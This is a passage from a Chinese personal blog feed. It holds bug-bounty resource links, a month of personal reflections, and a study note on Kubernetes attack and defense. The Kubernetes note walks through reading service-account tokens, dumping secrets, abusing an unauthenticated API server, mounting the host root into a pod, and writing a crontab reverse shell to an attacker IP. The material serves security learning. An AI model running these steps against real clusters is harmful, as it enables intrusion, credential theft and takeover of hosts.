href="https://security.oppo.com/">https://security.oppo.com/</a></p></li><li><p>腾讯安全应急响应中心<br><a href="https://security.tencent.com/">https://security.tencent.com/</a></p></li><li><p>SRC漏洞平台<br><a href="https://blog.51cto.com/u_13567054/4981736">https://blog.51cto.com/u_13567054/4981736</a></p></li></ol><h2 id="资产收集-1"><a href="#资产收集-1" class="headerlink" title="资产收集"></a>资产收集</h2><ol><li><p>打开“企查查”或类似网站，从“知识产权”查找备案网站，app，小程序，公众号之类的</p></li><li><p>可使用 “七麦数据”</p></li><li><p>小蓝本</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本课主要介绍挖漏洞的注意事项。这是逻辑漏洞课程第一课。&lt;/p&gt;</summary>
    
    
    
    <category term="SRC" scheme="http://example.com/categories/SRC/"/>
    
    
    <category term="SRC" scheme="http://example.com/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>10月随笔</title>
    <link href="http://example.com/2023/11/07/2023%E5%B9%B410%E6%9C%88%E9%9A%8F%E7%AC%94/"/>
    <id>http://example.com/2023/11/07/2023%E5%B9%B410%E6%9C%88%E9%9A%8F%E7%AC%94/</id>
    <published>2023-11-06T16:00:00.000Z</published>
    <updated>2023-11-07T14:28:43.410Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Elaina_68.png" alt="Elaina"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在我自己写的东西，分为了两块，一块是以博客为主的长内容，一块是以频道为主短内容。<br>博客是任何人都能看，频道只有我自己能看。<br>为什么这样分呢？<br>主要是有些时候，只是想说一两句话罢了，或者稍微发发牢骚，如果写个博客有点浪费，也没价值。所以不如放在频道里。<br>然后我打算每过一个月，将频道里我认为还算有价值的内容，发到博客。这样也算是去粗留精了。</p><h1 id="装饰"><a href="#装饰" class="headerlink" title="装饰"></a>装饰</h1><p>如果一个人只有见人，才会整理打扮仪容，那说明本质上这个人对外貌所作的“装饰”只是为了别人，而非自己。</p><h1 id="从众"><a href="#从众" class="headerlink" title="从众"></a>从众</h1><p>昨日去喝了粥，喝了之后感觉良好，但在这之前，我都不知道有这么一家店的存在。<br>现在想了想，大概是因外表比较简陋，店内客人不多，让我忽略了它。<br>所谓不可貌相，时刻在提醒我。<br>也能看出，从众，不一定就是对的。大多数时候只是为了减小风险而做的保守策略罢了，但有时也要敢于冒险。</p><h1 id="文化"><a href="#文化" class="headerlink" title="文化"></a>文化</h1><p>文化是一种影响存在的氛围。</p><h1 id="无聊"><a href="#无聊" class="headerlink" title="无聊"></a>无聊</h1><p>当人工作忙起来了一段日子，再去做一些简单信息量低的事，就会觉得无聊。因为输入小于消化的速度。</p><h1 id="关心"><a href="#关心" class="headerlink" title="关心"></a>关心</h1><p>很多时候，人们询问他人私事只是出于好奇，而非关心。</p><h1 id="价值"><a href="#价值" class="headerlink" title="价值"></a>价值</h1><p>价值，就是创造或延伸一种存在的概念。</p><h1 id="世界"><a href="#世界" class="headerlink" title="世界"></a>世界</h1><p>错的不是我，而是这个世界。</p><p>读完马斯克传后，这句话能理解了。</p><h1 id="紧迫"><a href="#紧迫" class="headerlink" title="紧迫"></a>紧迫</h1><p>不要陷入到一种慢吞吞的节奏中，不要认为什么东西很难，保持紧迫感。</p><h1 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h1><p>聊天主要带来的就是情绪价值。<br>如果是跟值得的人一起聊，那么或许还能提高认知，获得知识。<br>前者是至少应有的，后者不当过度期望。</p><h1 id="鼻子"><a href="#鼻子" class="headerlink" title="鼻子"></a>鼻子</h1><p>《鼻子》  芥川龙之介<br>我的思考：<br>我自己想要的，真的是我想要的吗？还是别人眼中的自己。<br>融入群体，与他人别无二致，是为了更好的自己，还是为了处于群体中的安心感。</p><h1 id="精力"><a href="#精力" class="headerlink" title="精力"></a>精力</h1><p>我想要让自己时刻保持精力充沛，而不是一天死气沉沉要死不活的样子。</p><p>查阅相关资料与结合个人思考，我认为应该采取以下措施：</p><ol><li>起床后锻炼5分钟</li><li>激烈地表达</li><li>多喝水</li><li>多补充能量</li><li>听摇滚音乐</li><li>一次只做一件事</li><li>再坚持10分钟</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>看起来，自己一个月的思考并不多，不知道是因为忙碌，还是因为到了一定程度就开始迟缓呢？<br>10月读了两本书，艾萨克森的《埃隆马斯克传》和芥川龙之介的《罗生门》。前者给了我一些处世哲学的转变，后者给了我自身与人性的思考。<br>10月interview了不少，可惜都没过呢。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Elaina_68.png&quot; alt=&quot;Elaina&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    <category term="10月" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/10%E6%9C%88/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>K8s集群安全攻防学习</title>
    <link href="http://example.com/2023/11/02/K8s%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/11/02/K8s%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-11-01T16:00:00.000Z</published>
    <updated>2023-11-02T00:47:28.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为感觉是一个比较重要的部分，之前接触较少，于是打算系统性地学习一下。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>Container(容器)是一种便携式、轻量级的操作系统级虚拟化技术，它使用namespace隔离不同的软件运行环境，并通过镜像自包含软件的运行环境，从而使得容器可以很方便的在任何地方运行，由于容器体积小且启动快，因此可以在每个容器镜像中打包一个应用程序，这种一对一的应用镜像关系拥有很多好处，使用容器不需要与外部的基础架构环境绑定，因为每一个应用程序都不需要外部依赖，更不需要与外部的基础架构环境依赖，完美解决了从开发到生产环境的一致性问题</p><h2 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h2><p>Kubernetes使用Pod来管理容器，每个Pod可以包含一个或多个紧密关联的容器，Pod是一组紧密关联的容器集合，它们共享PID、IPC、Network 和UTS Namespace，是Kubernetes调度的基本单位，Pod内的多个容器共享网络和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务<br><img src="/simg/K8s-1.png" alt="pod"><br>在Kubernetes中对象使用ManiFest(YAML或JSON)来定义，一个简单的Nginx服务可以定义为nginx.yaml，它包含一个镜像为nginx的容器，示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">    name: nginx</span><br><span class="line">    labels:</span><br><span class="line">        app: nginx</span><br><span class="line">spec:</span><br><span class="line">    containers:</span><br><span class="line">    -name: nginx</span><br><span class="line">         image: nginx</span><br><span class="line">         ports:</span><br><span class="line">        -containerPort: 80</span><br></pre></td></tr></table></figure><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><p>Node是Pod真正运行的主机，可以是物理机，也可以是虚拟机，为了管理Pod每个Node节点上至少要运行Container Runtime(比如docker或者rkt)、 Kubelet和Kube-proxy服务<br><img src="/simg/K8s-2.png" alt="node"></p><h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p>Namespace是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组，常见的pods, services, replication controllers和deployments等都是属于某一个namespace的(默认是default)，而node, persistentVolumes等则不属于任何namespace</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Service是应用服务的抽象，通过labels为应用提供负载均衡和服务发现，匹配labels的Pod IP和端口列表组成endpoints，由kube-proxy负责将服务IP负载均衡到这些endpoints上，通常每一个Service都会自动分配一个Cluster IP(仅在集群内部可访问的虚拟地址)和DNS名，其他容器可以通过该地址或DNS来访问服务，而不需要了解后端容器的运行：<br><img src="/simg/K8s-2.png" alt="service"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">    name: nginx</span><br><span class="line">spec:</span><br><span class="line">    ports:</span><br><span class="line">        - port: 8078 # the port that this service should serve on</span><br><span class="line">        name: http</span><br><span class="line">        # the container on each pod to connect to, can be a name</span><br><span class="line">        # (e.g. &#x27;www&#x27;) or a number (e.g. 80)</span><br><span class="line">        targetPort: 80</span><br><span class="line">        protocol: TCP</span><br><span class="line">    selector:</span><br><span class="line">        app: nginx</span><br></pre></td></tr></table></figure><h1 id="架构概览"><a href="#架构概览" class="headerlink" title="架构概览"></a>架构概览</h1><h2 id="架构源起"><a href="#架构源起" class="headerlink" title="架构源起"></a>架构源起</h2><p>Borg是谷歌内部的大规模集群管理系统，负责对谷歌内部很多核心服务的调度和管理，Borg的目的是让用户能够不必操心资源管理的问题，让他们专注于自己的核心业务，并且做到跨多个数据中心的资源利用率最大化<br>Borg主要由BorgMaster、Borglet、Borgcfg和Scheduler组成，架构示意图如下：<br><img src="/simg/K8s-4.png" alt="borg"><br>Borglet：负责真正运行任务(在容器中)<br>Borgcfg：Borg的命令行工具，用于跟Borg系统交互，一般通过一个配置文件来提交任务<br>Scheduer：负责任务的调度，根据应用的特点将其调度到具体的机器上去<br>BorgMaster：是整个集群的大脑，负责维护整个集群的状态，并将数据持久化到 Paxos 存储中</p><h2 id="架构模型"><a href="#架构模型" class="headerlink" title="架构模型"></a>架构模型</h2><p>K8s借鉴了Borg的设计理念，比如:Pod、Service、Label、单Pod、单IP等，Kubernetes的整体架构跟Borg非常像，如下图所示：<br><img src="/simg/K8s-5.png" alt="k8s"><br>K8s主要由以下几个核心组件组成：<br>etcd：保存了整个集群的状态<br>apiserver：提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制<br>controller manager：负责维护集群的状态，比如：故障检测、自动扩展、滚动更新等<br>scheduler：负责资源的调度，按照预定的调度策略将Pod调度到相应的机器上<br>kubelet：负责维护容器的生命周期，同时也负责Volume(CSI)和网络(CNI)的管理<br>Container runtime：负责镜像管理以及Pod和容器的真正运行(CRI)<br>kube-proxy：负责为Service提供cluster内部的服务发现和负载均衡</p><h1 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h1><p>Kubernetes主要由以下几个核心组件组成，这也是我们对K8s进行安全评估的主要测试维度：<br>etcd：保存了整个集群的状态<br>apiserver：提供了资源操作的唯一入口，并提供认证、授权、访问控制、API注册和发现等机制<br>controller manager：负责维护集群的状态，比如故障检测、自动扩展、滚动更新等<br>scheduler：负责资源的调度，按照预定的调度策略将Pod调度到相应的机器上<br>kubelet：负责维护容器的生命周期，同时也负责Volume(CVI)和网络(CNI)的管理<br>Container runtime：负责镜像管理以及Pod和容器的真正运行(CRI）<br>kube-proxy：负责为Service提供cluster内部的服务发现和负载均衡</p><p><img src="/simg/K8s-6.png" alt="kubernetes"></p><p>下面是关键组件的一些常用默认端口：<br><img src="/simg/K8s-7.png" alt="Protocol"></p><h1 id="渗透路径"><a href="#渗透路径" class="headerlink" title="渗透路径"></a>渗透路径</h1><p>常见的K8S的渗透路径：<br><img src="/simg/K8s-8.png" alt="path"><br>形象的K8S的渗透过程：<br><img src="/simg/K8s-9.png" alt="path"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>我们评估是如果获取到应用的webshell权限时是很有必要判断一下当前的环境的，最狠的一次是之前打HW的时候有厂商搭建了一套完整的域环境的蜜罐系统，看着你打…..，所以这个阶段要做的还是信息收集</p><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><p><code>env</code><br><img src="/simg/K8s-10.png" alt="env"></p><p><code>env | grep KUBERNETES</code><br><img src="/simg/K8s-11.png" alt="env"></p><h2 id="容器检测"><a href="#容器检测" class="headerlink" title="容器检测"></a>容器检测</h2><p>注意下面的.dockerenv：<br><code>ls -al</code><br><img src="/simg/K8s-12.png" alt="ls"></p><h2 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h2><p>需要下载kubectl到pod中，之后通过执行以下命令来获取node节点的内核版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get nodes -o jsonpath=&#x27;&#123;range .items[*]&#125;&#123;.metadata.name&#125;&#123;&quot;\t&quot;&#125;&#123;.status.nodeInfo.kernelVersion&#125;&#123;&quot;\n&quot;&#125;&#123;end&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-13.png" alt="kubectl"></p><h2 id="Token类"><a href="#Token类" class="headerlink" title="Token类"></a>Token类</h2><p>K8s集群创建的Pod中容器内部默认携带K8s Service Account认证凭据(&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token)，利用该凭据可以认证K8s API-Server服务器并访问高权限接口，如果执行成功意味着该账号拥有高权限，可以直接利用Service Account管理K8s集群<br><code>cat /var/run/secrets/kuberenetes.io/serviceaccount/token</code><br><img src="/simg/K8s-14.png" alt="token"></p><h2 id="Secret类"><a href="#Secret类" class="headerlink" title="Secret类"></a>Secret类</h2><p>K8s Secrets用于存储敏感数据，从Secrets中获取的AK及通信凭证可用户后续渗透中从外部或云产品API窃取信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令格式</span></span><br><span class="line">./cdk run k8s-secret-dump (auto|&lt;service-account-token-path&gt;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span class="line">./cdk run k8s-secret-dump auto</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-15.png" alt="secret"></p><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><p>对于已经获取了kubeconfig或sa账号权限，进而想要创建特殊配置的容器，但是受到了K8s Pod Security Policies的限制时可以使用这个Exploit获取Pod Security Policies的规则信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令格式</span></span><br><span class="line">./cdk run k8s-psp-dump (auto|&lt;service-account-token-path&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span class="line">./cdk run k8s-psp-dump auto</span><br><span class="line">2021/03/24 22:15:58 getting K8s api-server API addr.</span><br><span class="line">    Find K8s api-server in ENV: https://ip:8443</span><br><span class="line">2021/03/24 22:15:58 trying to dump K8s Pod Security Policies with local service-account: token</span><br><span class="line">2021/03/24 22:15:58 requesting  /apis/policy/v1beta1/podsecuritypolicies</span><br><span class="line">2021/03/24 22:15:58 dump Pod Security Policies success, saved in:  k8s_pod_security_policies.json</span><br><span class="line">2021/03/24 22:15:58 requesting  /api/v1/namespaces/default/pods</span><br><span class="line">2021/03/24 22:15:58 K8S Pod Security Policies rule list:</span><br><span class="line">2021/03/24 22:15:58 rule &#123; securityContext.hostPID: true &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; securityContext.hostIPC: true &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[0].hostPath.pathPrefix: \&quot;/proc\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[1].hostPath.pathPrefix: \&quot;/dev\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[2].hostPath.pathPrefix: \&quot;/sys\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[3].hostPath.pathPrefix: \&quot;/\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; containers[0].securityContext.capabilities.add: \&quot;SYS_ADMIN\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; containers[0].securityContext.capabilities.add: \&quot;SYS_PTRACE\&quot; &#125; is not allowed.</span><br></pre></td></tr></table></figure><h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><p><img src="/simg/K8s-16.png" alt="port"></p><h2 id="内部网络"><a href="#内部网络" class="headerlink" title="内部网络"></a>内部网络</h2><p>Flannel默认使用10.244.0.0&#x2F;16网络<br>Calico默认使用192.168.0.0&#x2F;16网络</p><h1 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h1><p>这一部分主要介绍一些常见的因为K8s自身的漏洞或者安全配置不当导致的可被利用的漏洞点：</p><h2 id="未授权类"><a href="#未授权类" class="headerlink" title="未授权类"></a>未授权类</h2><h3 id="K8s-API-Server未授权"><a href="#K8s-API-Server未授权" class="headerlink" title="K8s API Server未授权"></a>K8s API Server未授权</h3><h4 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h4><p>k8s的Master节点上会暴露kube-apiserver，默认情况下会开启以下两个HTTP端口：<br>A：Localhost Port</p><ul><li>HTTP服务</li><li>主机访问受保护</li><li>在HTTP中没有认证和授权检查</li><li>默认端口8080，修改标识–insecure-port</li><li>默认IP是本地主机，修改标识—insecure-bind-address</li></ul><p>B：Secure Port</p><ul><li>使用基于策略的授权方式</li><li>认证方式，令牌文件或者客户端证书</li><li>默认端口6443，修改标识—secure-port</li><li>默认IP是首个非本地主机的网络接口，修改标识—bind-address</li><li>HTTPS服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file</li></ul><p>以上两个端口主要存在以下两类安全风险：<br>开发者使用8080端口并将其暴露在公网上，攻击者就可以通过该端口的API直接对集群下发指令<br>运维人员将”system:anonymous”用户绑定到”cluster-admin”用户组，使匿名用户可以通过6443端口以管理员权限向集群内部下发指令</p><h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>在浏览器中访问以下URL：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">http://ip:port/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span class="line">http://192.168.17.144:8080/</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-17.png" alt="poc"><br>返回以上信息说明存在K8s API Server未授权访问漏洞~</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用方式按严重程度可分为以下两种攻击类型：</p><ul><li>通过利用kubectl客户端调用Secure Port接口去控制已经创建好的容器</li><li>通过创建一个自定义的容器将系统根目录的文件挂载到&#x2F;mnt目录，之后通过修改&#x2F;mnt&#x2F;etc&#x2F;crontab来影响宿主机的crontab，通过反弹Shell拿到宿主机的权限</li></ul><h4 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h4><p>Step 1：获取目标机器的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">kubectl -s ip:port get nodes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行实例</span></span><br><span class="line">kubectl -s 192.168.17.144:8080 get nodes</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-18.png" alt="container"><br>备注说明：如果出现”Error from server (NotFound): the server could not find the requested resource”报错，可能是因为Kubectl客户端和K8s的Server端版本不相同导致的需要进行降级操作，此时需要将版本降低到和目标主机版本一致即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.8.7/bin/linux/amd64/kubectl</span><br><span class="line">chmod 777 kubectl</span><br><span class="line">mv /usr/bin/kubectl /usr/bin/kubectl.bak</span><br><span class="line">mv kubectl /usr/bin/kubectl</span><br></pre></td></tr></table></figure><p>Step 2：获取命名空间<br><code>kubectl -s 192.168.17.144:8080 get namespace</code><br><img src="/simg/K8s-19.png" alt="namespace"></p><p>Step 3：获取某一命名空间下的Pod列表<br><code>kubectl -s 192.168.17.144:8080 get pod -n default</code></p><p>Step 4：执行以下命令接管pod，可以看到下方返回的提示是”pod nginx does not have a host assigned”，这是由于pod未指定host所致</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">kubectl -s ip:port  --namespace=default exec -it dockername bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行实例</span></span><br><span class="line">kubectl -s 192.168.17.144:8080 -n default exec -it nginx /bin/sh</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-20.png" alt="pod"></p><p>nginx的yaml文件如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>                      </span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span>                           </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span>                       </span><br><span class="line"><span class="attr">spec:</span>                               </span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:alpine</span>             </span><br><span class="line">    <span class="attr">name:</span> <span class="string">container-0</span>               </span><br><span class="line">    <span class="attr">resources:</span>                      </span><br><span class="line">      <span class="attr">limits:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">100m</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">200Mi</span></span><br><span class="line">      <span class="attr">requests:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">100m</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">200Mi</span></span><br><span class="line">  <span class="attr">imagePullSecrets:</span>                 </span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default-secret</span></span><br></pre></td></tr></table></figure><p>如果幸运的化我们可以找到恰当的Pod并通过信息收集以及逃逸获取宿主机的权限，之后控制节点以及整个集群</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>A、Web Dashboard<br>Step 1：查看当前Namespace确定命名空间有哪些<br><code>kubectl -s 192.168.17.144:8080 get namespaces</code><br><img src="/simg/K8s-21.png" alt="namespace"></p><p>Step 2：查看”kubernetes-dashboard”命名空间下pod与service的详细状态<br><code>kubectl -s 192.168.17.144:8080 get pods,svc -n kubernetes-dashboard -o wide</code><br><img src="/simg/K8s-22.png" alt="dashboard"></p><p>Step 3：查看Serviceaccount和Secrets<br><code>kubectl -s 192.168.17.144:8080 get sa,secrets -n kubernetes-dashboard</code><br><img src="/simg/K8s-23.png" alt="secrets"></p><p>Step 4：查看token，在这里我们要根据上一步的输出进行多项service-account-token的查看，因为部分会应权限而导致操作有限<br><code>kubectl -s 192.168.17.144:8080 describe secrets admin-myuser-token-jcj9d -n kubernetes-dashboard</code><br><img src="/simg/K8s-24.png" alt="token"></p><p>Step 5：尝试登录DashBoard<br><img src="/simg/K8s-25.png" alt="login"></p><p>Step 6：创建一个pod，并将本地根目录挂载到pod的&#x2F;mnt目录中</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">container</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-26.png" alt="pod"><br><img src="/simg/K8s-27.png" alt="pod"></p><p>Step 7：之后可以看到创建的myapp Pod<br><img src="/simg/K8s-28.png" alt="pod"></p><p>Step 8：之后进入挂载的&#x2F;mnt目录中，就是master节点的对应目录了<br><img src="/simg/K8s-29.png" alt="pod"><br><img src="/simg/K8s-30.png" alt="pod"></p><p>Step 9：之后写计划任务<br><code>echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.17.158/4444 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab</code><br><img src="/simg/K8s-31.png" alt="pod"></p><p>Step 10：成功反弹shell<br><img src="/simg/K8s-32.png" alt="pod"></p><p>后面懒得写了…</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://xz.aliyun.com/t/12921">K8s集群安全攻防(上)</a><br><a href="https://xz.aliyun.com/t/12930">K8s集群安全攻防(下)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为感觉是一个比较重要的部分，之前接触较少，于是打算系统性地学习一下。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>MISC杂项 - buuctf</title>
    <link href="http://example.com/2023/11/01/MISC%E6%9D%82%E9%A1%B9%20-%20buuctf/"/>
    <id>http://example.com/2023/11/01/MISC%E6%9D%82%E9%A1%B9%20-%20buuctf/</id>
    <published>2023-10-31T16:00:00.000Z</published>
    <updated>2023-12-11T13:23:13.361Z</updated>
    
